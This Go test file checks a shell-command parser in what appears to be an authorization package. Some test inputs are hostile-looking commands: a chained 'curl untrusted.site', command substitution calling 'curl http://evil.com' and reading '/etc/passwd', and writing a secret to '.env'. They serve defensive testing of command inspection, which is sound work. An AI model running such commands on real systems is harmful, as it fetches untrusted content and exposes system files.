package authz

import (
	"testing"
)

func TestParseAST_Simple(t *testing.T) {
	pipe, err := ParseAST("git status")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if n.Executable != "git" {
		t.Errorf("expected exec 'git', got %q", n.Executable)
	}
	if len(n.Args) != 2 || n.Args[1] != "status" {
		t.Errorf("expected args ['git', 'status'], got %v", n.Args)
	}
}

func TestParseAST_Chained(t *testing.T) {
	cmd := "git status && curl untrusted.site"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 2 {
		t.Fatalf("expected 2 nodes, got %d", len(pipe.Nodes))
	}

	n0 := pipe.Nodes[0]
	if n0.Executable != "git" || n0.Operator != "&&" {
		t.Errorf("node 0 mismatch: exec=%q, op=%q", n0.Executable, n0.Operator)
	}

	n1 := pipe.Nodes[1]
	if n1.Executable != "curl" || n1.Operator != "" {
		t.Errorf("node 1 mismatch: exec=%q, op=%q", n1.Executable, n1.Operator)
	}
}

func TestParseAST_PipeAndSemicolon(t *testing.T) {
	cmd := "cat file.txt | grep error ; ls -la"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 3 {
		t.Fatalf("expected 3 nodes, got %d", len(pipe.Nodes))
	}

	if pipe.Nodes[0].Executable != "cat" || pipe.Nodes[0].Operator != "|" {
		t.Errorf("node 0 mismatch: %v", pipe.Nodes[0])
	}
	if pipe.Nodes[1].Executable != "grep" || pipe.Nodes[1].Operator != ";" {
		t.Errorf("node 1 mismatch: %v", pipe.Nodes[1])
	}
	if pipe.Nodes[2].Executable != "ls" || pipe.Nodes[2].Operator != "" {
		t.Errorf("node 2 mismatch: %v", pipe.Nodes[2])
	}
}

func TestParseAST_Quoting(t *testing.T) {
	cmd := `git commit -m "feat: check && do something" 'single quoted & unparsed'`
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if len(n.Args) != 5 {
		t.Fatalf("expected 5 args, got %d: %v", len(n.Args), n.Args)
	}
	if n.Args[3] != "feat: check && do something" {
		t.Errorf("arg 3 mismatch: %q", n.Args[3])
	}
	if n.Args[4] != "single quoted & unparsed" {
		t.Errorf("arg 4 mismatch: %q", n.Args[4])
	}
}

func TestParseAST_SubshellExtraction(t *testing.T) {
	cmd := "echo $(curl http://evil.com) `cat /etc/passwd`"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 root node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if len(n.SubCommands) != 2 {
		t.Fatalf("expected 2 subcommands, got %d", len(n.SubCommands))
	}
	if n.SubCommands[0].Executable != "curl" {
		t.Errorf("subcommand 0 exec mismatch: got %q, want 'curl'", n.SubCommands[0].Executable)
	}
	if n.SubCommands[1].Executable != "cat" {
		t.Errorf("subcommand 1 exec mismatch: got %q, want 'cat'", n.SubCommands[1].Executable)
	}
}

func TestParseAST_Redirections(t *testing.T) {
	cmd := "echo secret > .env >> backup.env"
	pipe, err := ParseAST(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(pipe.Nodes) != 1 {
		t.Fatalf("expected 1 node, got %d", len(pipe.Nodes))
	}
	n := pipe.Nodes[0]
	if len(n.Redirections) != 2 {
		t.Fatalf("expected 2 redirections, got %d: %v", len(n.Redirections), n.Redirections)
	}
	if n.Redirections[0].Operator != ">" || n.Redirections[0].Target != ".env" {
		t.Errorf("redir 0 mismatch: %v", n.Redirections[0])
	}
	if n.Redirections[1].Operator != ">>" || n.Redirections[1].Target != "backup.env" {
		t.Errorf("redir 1 mismatch: %v", n.Redirections[1])
	}
}
